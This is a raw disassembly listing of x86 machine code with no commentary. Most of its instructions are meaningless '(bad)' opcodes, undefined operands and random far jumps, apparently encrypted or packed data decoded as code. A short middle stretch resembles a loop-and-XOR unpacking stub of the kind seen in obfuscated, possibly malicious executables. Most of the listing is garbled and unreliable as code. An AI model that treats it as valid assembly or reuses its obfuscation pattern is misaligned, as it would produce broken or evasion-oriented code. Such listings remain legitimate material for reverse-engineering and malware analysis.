  40f2dd:	int    0x58
  40f2df:	push   cs
  40f2e0:	push   0x26
  40f2e2:	mov    bh,0xaa
  40f2e4:	sbb    ebx,eax
  40f2e6:	pop    edi
  40f2e7:	push   ebp
  40f2e8:	push   ecx
  40f2e9:	call   0x95c3:0xac19dee2
  40f2f0:	sbb    eax,0xb6e8e9a
  40f2f5:	aaa    
  40f2f6:	and    DWORD PTR [ebp+0x6d],esp
  40f2f9:	ret    
  40f2fa:	and    al,0x98
  40f2fc:	push   ebx
  40f2fd:	sub    bl,bl
  40f2ff:	gs inc edx
  40f301:	test   DWORD PTR [edx],ebx
  40f303:	test   DWORD PTR [edx],ebp
  40f305:	inc    esp
  40f306:	and    ebx,ecx
  40f308:	push   eax
  40f309:	stos   BYTE PTR es:[edi],al
  40f30a:	retf   
  40f30b:	out    0x84,eax
  40f30d:	and    BYTE PTR [ebp+0x41628e7a],0x4e
  40f314:	sub    dl,bl
  40f316:	adc    DWORD PTR [esi+0x22],0xffffff97
  40f31a:	test   DWORD PTR [edx+edx*8-0x20db5e2e],0xff00b7d2
  40f325:	test   eax,0x7e2f3ea0
  40f32a:	inc    edx
  40f32b:	sbb    DWORD PTR [edi+ebx*8],ecx
  40f32e:	push   cs
  40f32f:	iret   
  40f330:	retf   0x5b38
  40f333:	in     eax,0xde
  40f335:	or     al,0x56
  40f337:	fbstp  TBYTE PTR [eax-0x3]
  40f33a:	cld    
  40f33b:	mov    cl,BYTE PTR [edx+0x2a]
  40f33e:	ja     0x40f2da
  40f340:	and    eax,0xa7061786
  40f345:	push   es
  40f346:	cmc    
  40f347:	ror    BYTE PTR [edx+0x8],1
  40f34a:	loopne 0x40f33e
  40f34c:	jle    0x40f382
  40f34e:	sub    eax,0x79c99edb
  40f353:	stos   BYTE PTR es:[edi],al
  40f354:	adc    ah,BYTE PTR [esi-0x30ff2374]
  40f35a:	fwait
  40f35b:	int    0x75
  40f35d:	(bad)  
  40f35e:	mov    ds:0xd387fca9,eax
  40f363:	push   ebx
  40f364:	dec    esp
  40f365:	arpl   WORD PTR [ebp+0x66],di
  40f368:	mov    bl,0x42
  40f36a:	out    0xf9,eax
  40f36c:	jl     0x40f34a
  40f36e:	or     bl,BYTE PTR [ecx-0x2ad74e8e]
  40f374:	aam    0xda
  40f376:	mov    edi,0xa5e9e80e
  40f37b:	add    DWORD PTR [edi],esp
  40f37d:	adc    BYTE PTR [ecx+edx*4-0xf],al
  40f381:	xchg   ecx,eax
  40f382:	cmp    ch,BYTE PTR [ebx]
  40f384:	pop    eax
  40f385:	push   esp
  40f386:	sar    BYTE PTR [ecx-0x1b],0xb1
  40f38a:	call   FWORD PTR [eax]
  40f38c:	fnstenv [ebx]
  40f38e:	add    BYTE PTR [ebx-0x26],cl
  40f391:	mov    dh,0x1b
  40f393:	std    
  40f394:	jmp    0x2e52:0x1da4ace4
  40f39b:	dec    edx
  40f39c:	mov    ecx,0xf98bc03e
  40f3a1:	ja     0x40f357
  40f3a3:	in     eax,0x4b
  40f3a5:	mov    bl,0x87
  40f3a7:	inc    esp
  40f3a8:	push   ds
  40f3a9:	scas   al,BYTE PTR es:[edi]
  40f3aa:	sub    DWORD PTR [ecx-0x59abbff2],edi
  40f3b0:	sub    al,bl
  40f3b2:	inc    esi
  40f3b3:	sahf   
  40f3b4:	xchg   esp,eax
  40f3b5:	mov    ?,WORD PTR [eax+0xa]
  40f3b8:	and    al,0x6f
  40f3ba:	jae    0x40f346
  40f3bc:	clc    
  40f3bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3be:	jmp    0x22d3:0xa74872f3
  40f3c5:	addr16 gs add eax,0x31a83bd4
  40f3cc:	sbb    al,0xfd
  40f3ce:	test   BYTE PTR [edx-0x6c],bl
  40f3d1:	jo     0x40f3aa
  40f3d3:	add    eax,0x2841a1a3
  40f3d8:	mov    dh,0xa3
  40f3da:	jbe    0x40f39a
  40f3dc:	mov    esp,0xe392d789
  40f3e1:	repz mov esp,0xc4d92c60
  40f3e7:	pop    edx
  40f3e8:	jle    0x40f3a2
  40f3ea:	xor    bl,bl
  40f3ec:	dec    ebx
  40f3ed:	push   0x4f
  40f3ef:	in     al,dx
  40f3f0:	mov    cl,0xb5
  40f3f2:	jae    0x40f417
  40f3f4:	pop    esp
  40f3f5:	pop    edx
  40f3f6:	sti    
  40f3f7:	xor    al,0x45
  40f3f9:	xor    BYTE PTR [eax+0x4043c023],cl
  40f3ff:	and    BYTE PTR [eax-0x61],0x62
  40f403:	cld    
  40f404:	int    0xd
  40f406:	cs add al,0xaa
  40f409:	loop   0x40f3ed
  40f40b:	mov    ds:0xeb07b0a6,al
  40f410:	aas    
  40f411:	test   DWORD PTR [ebx+0x35],edx
  40f414:	jbe    0x40f44b
  40f416:	inc    eax
  40f417:	adc    edx,DWORD PTR [esi+edx*8+0x3184359f]
  40f41e:	in     eax,0x3
  40f420:	mov    cl,0x2a
  40f422:	xchg   BYTE PTR [esi+0xf4b0ac],al
  40f428:	mov    bh,0x2e
  40f42a:	test   al,0x80
  40f42c:	xor    DWORD PTR [ebp-0x507fb5d5],edx
  40f432:	or     dh,BYTE PTR [ebx+edx*1]
  40f435:	jl     0x40f4a7
  40f437:	cmc    
  40f438:	cs (bad) 
  40f43b:	xor    dl,dh
  40f43d:	stos   BYTE PTR es:[edi],al
  40f43e:	lahf   
  40f43f:	push   ebx
  40f440:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f441:	int    0x35
  40f443:	cmp    DWORD PTR [edi],esi
  40f445:	add    eax,0xb98cbcdb
  40f44a:	xor    cl,BYTE PTR [eax-0x3e]
  40f44d:	mov    eax,0x292a8b4a
  40f452:	std    
  40f453:	and    edi,DWORD PTR [edx+0x0]
  40f456:	lea    esp,[edx]
  40f458:	xor    ah,dh
  40f45a:	mov    edx,0x3c889bb4
  40f45f:	sbb    eax,esi
  40f461:	add    ebx,DWORD PTR [edi-0x31]
  40f464:	mov    eax,ds:0xc806ab89
  40f469:	mov    ds:0xa120f0,al
  40f46e:	xchg   esp,eax
  40f46f:	pusha  
  40f470:	jmp    0xe2bb9986
  40f475:	sar    BYTE PTR [edx+ecx*8],0x7f
  40f479:	cmp    ebx,DWORD PTR [esi]
  40f47b:	add    bl,BYTE PTR [edi+ebp*8]
  40f47e:	cmp    bl,al
  40f480:	mov    cs,edi
  40f482:	ja     0x40f4c8
  40f484:	adc    al,0x5
  40f486:	adc    esi,DWORD PTR [edi]
  40f488:	cdq    
  40f489:	clc    
  40f48a:	push   ds
  40f48b:	mov    WORD PTR [ecx+0x2fe0197b],gs
  40f491:	pop    ebp
  40f492:	jecxz  0x40f4f4
  40f494:	ror    BYTE PTR [eax],0x8
  40f497:	xchg   BYTE PTR ds:0x3bf8f64a,ch
  40f49d:	aas    
  40f49e:	or     BYTE PTR [eax-0x104f3f97],cl
  40f4a4:	call   0xde5a:0x30d326e7
  40f4ab:	mov    DWORD PTR [ebp+eiz*8+0x5654d46f],0x52981447
  40f4b6:	nop
  40f4b7:	add    BYTE PTR [edi+0x198d079d],dh
  40f4bd:	xor    al,0x44
  40f4bf:	fadd   QWORD PTR [ebx+eiz*2-0x4e]
  40f4c3:	push   ebx
  40f4c4:	add    DWORD PTR [ebp+0x5a],esi
  40f4c7:	inc    BYTE PTR [esi+0x631cbf6f]
  40f4cd:	xchg   DWORD PTR [eax-0x3d96bb0e],eax
  40f4d3:	xchg   ebx,eax
  40f4d4:	xor    dl,BYTE PTR [edx+eiz*8]
  40f4d7:	fdivp  st(0),st
  40f4d9:	mov    eax,ds:0xc601ec09
  40f4de:	test   al,0xa2
  40f4e0:	sbb    eax,DWORD PTR [ebx-0x79a3c583]
  40f4e6:	fisub  WORD PTR [ebp-0x1]
  40f4e9:	mov    ?,ecx
  40f4eb:	push   ecx
  40f4ec:	mov    DWORD PTR [eax+ecx*4],esi
  40f4ef:	jns    0x40f51b
  40f4f1:	dec    ecx
  40f4f2:	fldcw  WORD PTR [ecx]
  40f4f4:	mov    cl,0x2d
  40f4f6:	add    BYTE PTR [edx-0x10],bl
  40f4f9:	sbb    BYTE PTR [ebx-0x22],dl
  40f4fc:	cdq    
  40f4fd:	jnp    0x40f525
  40f4ff:	inc    ebx
  40f500:	call   DWORD PTR [edi+0x393fa4c6]
  40f506:	out    dx,eax
  40f507:	xor    esi,DWORD PTR [edi+0x3d]
  40f50a:	dec    esi
  40f50b:	inc    eax
  40f50c:	sbb    edi,0x6
  40f50f:	mov    ds:0x3cb57dbb,al
  40f514:	fild   WORD PTR [ebp-0x7d]
  40f517:	(bad)  
  40f518:	mov    ebp,0xca8f0501
  40f51d:	mov    ebp,fs
  40f51f:	xor    eax,0xe9683aef
  40f524:	mov    WORD PTR [eax],ss
  40f526:	or     eax,DWORD PTR [edi+0x14]
  40f529:	mov    eax,ds:0xf876615a
  40f52e:	adc    DWORD PTR ds:0x60eac87,esi
  40f534:	pop    esp
  40f535:	popf   
  40f536:	scas   al,BYTE PTR es:[edi]
  40f537:	dec    ecx
  40f538:	xchg   BYTE PTR [edi+0x3d],ah
  40f53b:	pusha  
  40f53c:	int3   
  40f53d:	xchg   dl,bh
  40f53f:	mov    cs,edx
  40f541:	mov    edx,0x84cf7a57
  40f546:	jae    0x40f519
  40f548:	out    dx,al
  40f549:	dec    ebp
  40f54a:	and    al,0xfe
  40f54c:	adc    eax,0x25176610
  40f551:	jb     0x40f515
  40f553:	cmp    edx,DWORD PTR [edx-0x2]
  40f556:	cld    
  40f557:	add    al,cl
  40f559:	add    BYTE PTR [eax+0x600c30c4],ah
  40f55f:	int3   
  40f560:	mov    edx,0xe7143c32
  40f565:	mov    bh,0xc5
  40f567:	iret   
  40f568:	inc    ebp
  40f569:	adc    DWORD PTR [esi],eax
  40f56b:	push   ebx
  40f56c:	rol    BYTE PTR ds:0xea79d3d1,cl
  40f572:	lahf   
  40f573:	fdiv   DWORD PTR [esi+0x17de3c5c]
  40f579:	sub    esp,DWORD PTR [ebx+0x6e692939]
  40f57f:	ins    BYTE PTR es:[edi],dx
  40f580:	cld    
  40f581:	je     0x40f574
  40f583:	mov    bh,0x8b
  40f585:	jp     0x40f52e
  40f587:	pop    edx
  40f588:	mov    bh,0x19
  40f58a:	les    ebp,FWORD PTR [eax-0x27]
  40f58d:	push   edi
  40f58e:	jne    0x40f590
  40f590:	adc    bh,0x4c
  40f593:	mov    bh,0x15
  40f595:	or     DWORD PTR [ebx+0x14388011],ebx
  40f59b:	push   ecx
  40f59c:	or     ebp,DWORD PTR [ecx]
  40f59e:	pop    es
  40f59f:	xor    dl,dh
  40f5a1:	loop   0x40f5f1
  40f5a3:	mov    esp,0xfe5c0fe5
  40f5a8:	or     eax,DWORD PTR [edi+0x6143759e]
  40f5ae:	cmp    al,0x58
  40f5b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5b1:	mov    ch,BYTE PTR [eax]
  40f5b3:	repnz cmp BYTE PTR [ecx+0x66],0x20
  40f5b8:	es pusha 
  40f5ba:	and    BYTE PTR [eax+0x31797d5c],dl
  40f5c0:	jge    0x40f5e9
  40f5c2:	inc    ebx
  40f5c3:	xchg   dh,bh
  40f5c5:	or     edx,DWORD PTR [edi]
  40f5c7:	loope  0x40f59c
  40f5c9:	stos   BYTE PTR es:[edi],al
  40f5ca:	fcom   QWORD PTR [ebp-0x51f9e145]
  40f5d0:	int3   
  40f5d1:	xchg   ebx,eax
  40f5d2:	rcr    BYTE PTR [ecx],cl
  40f5d4:	les    edi,FWORD PTR [esi+0x64]
  40f5d7:	sbb    DWORD PTR cs:[ebx+0x488229a3],ebp
  40f5de:	imul   esp,DWORD PTR [eax],0xcf1bea9e
  40f5e4:	fistp  DWORD PTR [edx+0x5]
  40f5e7:	push   ebx
  40f5e8:	mov    BYTE PTR [eax],cl
  40f5ea:	sub    al,0x54
  40f5ec:	lahf   
  40f5ed:	popa   
  40f5ee:	push   ds
  40f5ef:	out    0x36,eax
  40f5f1:	gs js  0x40f580
  40f5f4:	popa   
  40f5f5:	inc    esi
  40f5f6:	mov    edi,0x218c68ba
  40f5fb:	fldenv [esi+0x41]
  40f5fe:	xor    dh,BYTE PTR ds:0xe21a2f84
  40f604:	mov    bh,0x3b
  40f606:	mov    ch,0x89
  40f608:	mov    al,ds:0x82b5d35d
  40f60d:	xor    BYTE PTR [edi],bl
  40f60f:	sar    BYTE PTR [ebp-0x47],cl
  40f612:	jmp    0xd310a6df
  40f617:	and    al,0xb8
  40f619:	lea    edx,[eax+0x77]
  40f61c:	out    0x82,al
  40f61e:	mov    ebp,0x38657d4b
  40f623:	dec    ecx
  40f624:	mov    ds:0xebc2360f,eax
  40f629:	mov    dl,0xfa
  40f62b:	pop    ebp
  40f62c:	dec    edx
  40f62d:	retf   
  40f62e:	popa   
  40f62f:	cs and al,0x91
  40f632:	xchg   ecx,eax
  40f633:	(bad)  
  40f634:	ins    DWORD PTR es:[edi],dx
  40f635:	dec    edi
  40f636:	aas    
  40f637:	mov    ebp,0x9b057733
  40f63c:	jno    0x40f63b
  40f63e:	popa   
  40f63f:	xchg   ebx,eax
  40f640:	dec    ebp
  40f641:	daa    
  40f642:	lea    ecx,[edi+0x33c12812]
  40f648:	int    0x6d
  40f64a:	cdq    
  40f64b:	std    
  40f64c:	adc    DWORD PTR [esi+0x3f],eax
  40f64f:	iret   
  40f650:	inc    esp
  40f651:	jmp    0xd133:0xec47adae
  40f658:	sti    
  40f659:	ja     0x40f6b0
  40f65b:	jae    0x40f683
  40f65d:	iret   
  40f65e:	pusha  
  40f65f:	dec    BYTE PTR [edi]
  40f661:	jl     0x40f6db
  40f663:	std    
  40f664:	test   al,0x6f
  40f666:	jge    0x40f65b
  40f668:	push   cs
  40f669:	xlat   BYTE PTR ds:[ebx]
  40f66a:	ror    DWORD PTR ds:0x8380333f,0xdd
  40f671:	shl    bl,0x84
  40f674:	pop    ebx
  40f675:	mov    esi,0x33648067
  40f67a:	ret    0x78c2
  40f67d:	and    eax,0xfdce8d10
  40f682:	pop    esp
  40f683:	test   al,0xa4
  40f685:	call   0xae83:0x7444e216
  40f68c:	and    DWORD PTR [ecx-0x62],ebp
  40f68f:	push   esp
  40f690:	mov    WORD PTR [edi-0x6e],es
  40f693:	outs   dx,DWORD PTR ds:[esi]
  40f694:	call   0x2203:0xed1783f6
  40f69b:	ror    DWORD PTR [edi+0x244c07f5],1
  40f6a1:	lods   eax,DWORD PTR ds:[esi]
  40f6a2:	mov    bh,al
  40f6a4:	xchg   ebp,eax
  40f6a5:	mov    BYTE PTR [edi+0x12],dh
  40f6a8:	fnstenv [edi-0x211ce923]
  40f6ae:	pop    ds
  40f6af:	pop    ds
  40f6b0:	mov    eax,0x4d8ab2de
  40f6b5:	dec    edx
  40f6b6:	fdivr  st(0),st
  40f6b8:	cs (bad) 
  40f6ba:	loope  0x40f64f
  40f6bc:	jno    0x40f6ed
  40f6be:	xor    DWORD PTR [ebx],esp
  40f6c0:	push   ds
  40f6c1:	sub    eax,0xf677e9f9
  40f6c6:	ds mov dl,0x50
  40f6c9:	in     eax,dx
  40f6ca:	jno    0x40f664
  40f6cc:	sub    ah,al
  40f6ce:	jl     0x40f700
  40f6d0:	inc    eax
  40f6d1:	call   0xc62c3f90
  40f6d6:	jl     0x40f6dd
  40f6d8:	sub    edx,DWORD PTR [eiz*8+0x1e74434b]
  40f6df:	cmp    eax,0x819de5a9
  40f6e4:	aas    
  40f6e5:	mov    dh,0xcb
  40f6e7:	adc    esi,DWORD PTR [eax+0x398574eb]
  40f6ed:	(bad)  
  40f6ee:	arpl   WORD PTR [ecx],bx
  40f6f0:	mov    ch,0xd5
  40f6f2:	mov    ah,0xb7
  40f6f4:	mov    BYTE PTR ds:0xfcaeed9e,bl
  40f6fa:	loop   0x40f74d
  40f6fc:	pop    es
  40f6fd:	mov    dh,0x6b
  40f6ff:	fst    DWORD PTR [esi+0x27]
  40f702:	add    DWORD PTR [esp+ebx*4],esi
  40f705:	sub    DWORD PTR [edi-0x51],esp
  40f708:	sub    al,0x25
  40f70a:	push   esi
  40f70b:	mov    edi,0x72f68d3a
  40f710:	into   
  40f711:	leave  
  40f712:	mov    ds:0x1f800674,eax
  40f717:	dec    edx
  40f718:	rcr    DWORD PTR [eax-0x45],cl
  40f71b:	adc    DWORD PTR ds:0x6704bd52,0x1a0860b5
  40f725:	(bad)  
  40f726:	push   ebx
  40f727:	jle    0x40f77c
  40f729:	sub    edx,DWORD PTR [ebx]
  40f72b:	push   esi
  40f72c:	repnz xor al,0x14
  40f72f:	push   ebp
  40f730:	cdq    
  40f731:	cmp    ah,BYTE PTR [edx]
  40f733:	imul   esi,DWORD PTR [esi],0xffffff91
  40f736:	iret   
  40f737:	cmp    al,0xd9
  40f739:	jmp    0x967b:0x9d58f602
  40f740:	push   ecx
  40f741:	enter  0xda72,0xc5
  40f745:	icebp  
  40f746:	mov    esp,0x5bed5892
  40f74b:	push   es
  40f74c:	pop    edx
  40f74d:	sub    al,0xd7
  40f74f:	inc    ecx
  40f750:	pop    eax
  40f751:	fscale 
  40f753:	icebp  
  40f754:	pop    edx
  40f755:	jecxz  0x40f765
  40f757:	call   0x785f:0x5770165e
  40f75e:	fs pop edx
  40f760:	pop    eax
  40f761:	fstp   QWORD PTR [ebp-0x604e8ef4]
  40f767:	jmp    0x40f704
  40f769:	and    BYTE PTR [esi-0x68bd2e9],ch
  40f76f:	das    
  40f770:	push   eax
  40f771:	data16 xor al,0x5c
  40f774:	jle    0x40f721
  40f776:	xchg   edx,eax
  40f777:	adc    esp,DWORD PTR [ecx-0x5ab06f05]
  40f77d:	jb     0x40f7fe
  40f77f:	sub    al,0x6d
  40f781:	scas   al,BYTE PTR es:[edi]
  40f782:	xor    esp,DWORD PTR [ecx+0x4b7db9b9]
  40f788:	dec    esp
  40f789:	ins    DWORD PTR es:[edi],dx
  40f78a:	mov    al,ds:0x93bb32d7
  40f78f:	pop    edi
  40f790:	in     eax,0x11
  40f792:	stos   BYTE PTR es:[edi],al
  40f793:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f794:	add    dl,bl
  40f796:	mov    eax,0x8b9d6eb3
  40f79b:	out    0x8c,eax
  40f79d:	bound  edx,QWORD PTR [eax-0x790968c5]
  40f7a3:	mov    edi,DWORD PTR [ecx-0x45]
  40f7a6:	scas   eax,DWORD PTR es:[edi]
  40f7a7:	stos   DWORD PTR es:[edi],eax
  40f7a8:	jno    0x40f7fb
  40f7aa:	lahf   
  40f7ab:	fwait
  40f7ac:	jp     0x40f743
  40f7ae:	or     dh,BYTE PTR [edx]
  40f7b0:	(bad)  
  40f7b1:	(bad)  
  40f7b2:	push   edi
  40f7b3:	lock mov ?,WORD PTR [esp+ebx*2]
  40f7b7:	mov    dh,0x53
  40f7b9:	jne    0x40f74a
  40f7bb:	rep ins BYTE PTR es:[edi],dx
  40f7bd:	mov    eax,0xcdc115d3
  40f7c2:	jge    0x40f7c4
  40f7c4:	inc    esp
  40f7c5:	mov    bh,0xb9
  40f7c7:	mov    bl,0x8
  40f7c9:	push   ecx
  40f7ca:	pop    es
  40f7cb:	xor    eax,ecx
  40f7cd:	or     DWORD PTR ds:0x426ed1,0x426eb9
  40f7d7:	add    eax,0x3272fa
  40f7dc:	mov    DWORD PTR [edx],eax
  40f7de:	and    DWORD PTR ds:0x426ed5,0x0
  40f7e8:	jmp    0x40f7fb
  40f7ed:	xor    eax,eax
  40f7ef:	or     eax,DWORD PTR ds:0x426ed5
  40f7f5:	inc    eax
  40f7f6:	mov    ds:0x426ed5,eax
  40f7fb:	cmp    DWORD PTR ds:0x426ed5,0x14
  40f802:	jae    0x40f83d
  40f808:	cmp    DWORD PTR ds:0x426ed5,0x5
  40f80f:	jb     0x40f83d
  40f815:	jmp    0x40f820
  40f81a:	call   DWORD PTR ds:0x42fa38
  40f820:	cmp    DWORD PTR ds:0x426ed5,0x4
  40f827:	jne    0x40f838
  40f82d:	mov    eax,ds:0x426ed5
  40f832:	inc    eax
  40f833:	mov    ds:0x426ed5,eax
  40f838:	jmp    0x40f7ed
  40f83d:	mov    eax,DWORD PTR [ebp+0xc]
  40f840:	xor    eax,ecx
  40f842:	push   esi
  40f843:	mov    esi,DWORD PTR [ebp+0x10]
  40f846:	mov    edx,0x3272fa
  40f84b:	add    eax,edx
  40f84d:	mov    DWORD PTR [esi+0x4],eax
  40f850:	mov    eax,DWORD PTR [ebp+0x14]
  40f853:	jmp    0x411bef
  40f858:	or     ecx,DWORD PTR [ecx+0x2a]
  40f85b:	mov    ds:0x7813f878,al
  40f860:	xor    al,0xd8
  40f862:	mov    edi,DWORD PTR ds:0x6a951196
  40f868:	fwait
  40f869:	dec    esi
  40f86a:	jnp    0x40f8e7
  40f86c:	clc    
  40f86d:	pushf  
  40f86e:	jnp    0x40f8eb
  40f870:	jmp    0x40f886
  40f872:	inc    esi
  40f873:	adc    BYTE PTR [edi],0xd5
  40f876:	sub    al,0x41
  40f878:	xor    eax,0xa36fcc50
  40f87d:	cmp    BYTE PTR [ebp+0x5a],al
  40f880:	out    dx,al
  40f881:	test   al,0xd6
  40f884:	arpl   si,si
  40f886:	push   ss
  40f887:	test   DWORD PTR [esi],ebx
  40f889:	int    0x83
  40f88b:	popf   
  40f88c:	ror    BYTE PTR [ebp+0x68],1
  40f88f:	icebp  
  40f890:	aam    0x3e
  40f892:	push   edx
  40f893:	frstor [edx-0x58]
  40f896:	sti    
  40f897:	add    cl,ch
  40f899:	xchg   ch,bl
  40f89b:	xor    ebp,DWORD PTR [edx+0x15]
  40f89e:	clc    
  40f89f:	outs   dx,DWORD PTR ds:[esi]
  40f8a0:	test   al,0x2e
  40f8a2:	sub    edx,DWORD PTR [eax-0x46]
  40f8a5:	nop
  40f8a6:	in     al,dx
  40f8a7:	rcr    ch,0x34
  40f8aa:	add    edx,DWORD PTR [edx-0x49]
  40f8ad:	inc    esp
  40f8ae:	mov    cl,0x1b
  40f8b0:	ds int 0xb2
  40f8b3:	daa    
  40f8b4:	das    
  40f8b5:	inc    ebx
  40f8b6:	mov    eax,0x860b56bf
  40f8bb:	leave  
  40f8bc:	aam    0xc6
  40f8be:	jnp    0x40f88d
  40f8c0:	mov    ebp,DWORD PTR [ebx+ebx*2]
  40f8c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8c4:	packssdw mm5,QWORD PTR [edi+0x75]
  40f8c8:	popa   
  40f8c9:	or     al,0xcf
  40f8cb:	cmp    dh,BYTE PTR ss:[eax-0xf]
  40f8cf:	shl    ebp,1
  40f8d1:	add    DWORD PTR [esi],edi
  40f8d3:	jns    0x40f8e7
  40f8d5:	push   ss
  40f8d6:	mov    ebp,0x82413d13
  40f8db:	sub    edi,DWORD PTR [ecx-0x400bd20]
  40f8e1:	mov    ah,0xac
  40f8e3:	sahf   
  40f8e4:	jg     0x40f88d
  40f8e6:	or     DWORD PTR [ecx-0x7cc1349c],ecx
  40f8ec:	hlt    
  40f8ed:	sub    ecx,DWORD PTR [ecx+0x1a138030]
  40f8f3:	jmp    0x40f881
  40f8f5:	pop    ds
  40f8f6:	lods   al,BYTE PTR ds:[esi]
  40f8f7:	test   al,0x97
  40f8f9:	pusha  
  40f8fa:	cmp    edx,edx
  40f8fc:	or     dl,BYTE PTR ds:0xa5e675bb
  40f902:	bound  dx,DWORD PTR [ebx+eax*1+0x17]
  40f907:	adc    cl,BYTE PTR [edx+0x3e]
  40f90a:	into   
  40f90b:	dec    ecx
  40f90c:	inc    ecx
  40f90d:	mov    eax,DWORD PTR [ebx+0x300c128f]
  40f913:	push   ebx
  40f914:	cmc    
  40f915:	out    dx,al
  40f916:	loopne 0x40f959
  40f918:	int    0xc7
  40f91a:	push   0x64a78bf3
  40f91f:	or     esi,DWORD PTR [esi]
  40f921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f922:	dec    esi
  40f923:	into   
  40f924:	imul   ebx,DWORD PTR ds:0x4beca8bd,0x50443345
  40f92e:	jp     0x40f941
  40f930:	push   edi
  40f931:	adc    al,0x11
  40f933:	and    eax,0x9e6c672d
  40f938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f939:	push   ebp
  40f93a:	loop   0x40f9ba
  40f93c:	dec    eax
  40f93d:	jge    0x40f98d
  40f93f:	pushf  
  40f940:	jae    0x40f969
  40f942:	dec    edx
  40f943:	add    ch,BYTE PTR [edi+0x7b0c69c9]
  40f949:	cdq    
  40f94a:	or     ebp,DWORD PTR [ebx]
  40f94c:	(bad)  
  40f94d:	jecxz  0x40f995
  40f94f:	push   edx
  40f950:	pop    eax
  40f951:	cdq    
  40f952:	dec    edx
  40f953:	xor    al,0x54
  40f955:	mov    cl,0x40
  40f957:	imul   ecx,DWORD PTR [edi-0x349262],0x48df53e4
  40f961:	std    
  40f962:	stos   BYTE PTR es:[edi],al
  40f963:	push   0x7e
  40f965:	lods   eax,DWORD PTR ds:[esi]
  40f966:	mov    ch,0xf
  40f968:	jmp    0x40f94f
  40f96a:	lods   al,BYTE PTR ds:[esi]
  40f96b:	fwait
  40f96c:	mov    eax,0x6d3ff8bc
  40f971:	stos   DWORD PTR es:[edi],eax
  40f972:	xchg   BYTE PTR [edi-0xc],dl
  40f975:	cmp    cl,bl
  40f977:	mov    edi,edx
  40f979:	sub    esi,DWORD PTR [ebx-0x75]
  40f97c:	push   edx
  40f97d:	jge    0x40f9f9
  40f97f:	aaa    
  40f980:	sub    DWORD PTR [ecx+0x7],ebp
  40f983:	data16 adc bl,BYTE PTR gs:[eax]
  40f987:	sbb    DWORD PTR [ebx],ebx
  40f989:	mov    dl,0x4b
  40f98b:	rcl    DWORD PTR [ecx],1
  40f98d:	adc    bl,BYTE PTR ds:0x4fec8131
  40f993:	mov    cl,0xe8
  40f995:	pop    ss
  40f996:	(bad)
  40f999:	pop    ebx
  40f99a:	js     0x40f989
  40f99c:	ins    BYTE PTR es:[edi],dx
  40f99d:	adc    BYTE PTR [ebx+0x31],ch
  40f9a0:	rcl    edi,1
  40f9a2:	cmp    al,BYTE PTR [edi]
  40f9a4:	jo     0x40fa19
  40f9a6:	xor    bl,dh
  40f9a8:	int3   
  40f9a9:	or     DWORD PTR [ecx+eax*4-0xd],eax
  40f9ad:	push   es
  40f9ae:	jbe    0x40f985
  40f9b0:	jmp    0x40f97c
  40f9b2:	sub    DWORD PTR [ebx+0x4a],edi
  40f9b5:	cmp    esi,DWORD PTR [esi]
  40f9b7:	push   edi
  40f9b8:	dec    ebp
  40f9b9:	and    BYTE PTR [edi-0x3589072f],0xc0
  40f9c0:	and    al,BYTE PTR [edi-0x2d]
  40f9c3:	mov    ds:0xac42d295,al
  40f9c8:	jmp    0xadff:0x59f3df5f
  40f9cf:	loope  0x40f98f
  40f9d1:	pop    eax
  40f9d2:	in     al,dx
  40f9d3:	repnz imul ecx,DWORD PTR [ebp-0x1054046],0xfffffff5
  40f9db:	aas    
  40f9dc:	sub    ebx,DWORD PTR [ecx-0x1dd51311]
  40f9e2:	or     al,0x53
  40f9e4:	in     al,dx
  40f9e5:	frndint 
  40f9e7:	xchg   ebp,eax
  40f9e8:	push   edx
  40f9e9:	xchg   edi,eax
  40f9ea:	xor    bh,BYTE PTR [ecx+ebp*4]
  40f9ed:	and    esi,DWORD PTR [eax]
  40f9ef:	hlt    
  40f9f0:	xor    BYTE PTR [ebx],0x5e
  40f9f3:	fisttp DWORD PTR [eax-0x7f]
  40f9f6:	adc    DWORD PTR [ebp+0x70],eax
  40f9f9:	fnstcw WORD PTR [esi+0x39]
  40f9fc:	or     BYTE PTR [edi],ch
  40f9fe:	sub    eax,0xaebdb497
  40fa03:	push   DWORD PTR ss:0xebdcdc70
  40fa0a:	sub    al,0x97
  40fa0c:	hlt    
  40fa0d:	ins    DWORD PTR es:[edi],dx
  40fa0e:	in     eax,0x7d
  40fa10:	out    dx,eax
  40fa11:	cmp    bl,BYTE PTR [ebx+0x63]
  40fa14:	mov    bh,0xfd
  40fa16:	jp     0x40fa16
  40fa18:	pop    edx
  40fa19:	imul   ebx,DWORD PTR [ebx-0x1da7d4af],0x3
  40fa20:	mov    ds:0xfd19bb5a,eax
  40fa25:	adc    al,0xfe
  40fa27:	xor    ebp,DWORD PTR ds:0x7b733f0c
  40fa2d:	pop    esi
  40fa2e:	jge    0x40f9b2
  40fa30:	mov    bl,0x23
  40fa32:	xchg   ebx,eax
  40fa33:	imul   eax,DWORD PTR [ebx+0x528e139b],0xf9061a01
  40fa3d:	ins    BYTE PTR es:[edi],dx
  40fa3e:	mov    al,0x26
  40fa40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa41:	and    dh,BYTE PTR [edi-0x621437e0]
  40fa47:	sbb    eax,DWORD PTR ds:0x5e67a471
  40fa4d:	stc    
  40fa4e:	or     bh,BYTE PTR [eax+eiz*8+0x6b80e4f]
  40fa55:	xchg   esi,eax
  40fa56:	or     bh,BYTE PTR [ebp-0x13227165]
  40fa5c:	sbb    al,0xb0
  40fa5e:	repnz sub DWORD PTR [ebp+0x409f712a],ebp
  40fa65:	(bad)  
  40fa66:	jnp    0x40fa2c
  40fa68:	push   0x53
  40fa6a:	adc    esp,DWORD PTR [eax-0x16]
  40fa6d:	mov    ah,dh
  40fa6f:	loop   0x40fa29
  40fa71:	mov    DWORD PTR [ecx+0x20],edi
  40fa74:	jg     0x40fa90
  40fa76:	call   0xdb88643e
  40fa7b:	into   
  40fa7c:	paddd  mm5,mm4
  40fa7f:	stos   BYTE PTR es:[edi],al
  40fa80:	jg     0x40fa1f
  40fa82:	addr16 jo 0x40faac
  40fa85:	jp     0x40facb
  40fa87:	jg     0x40fa6c
  40fa89:	das    
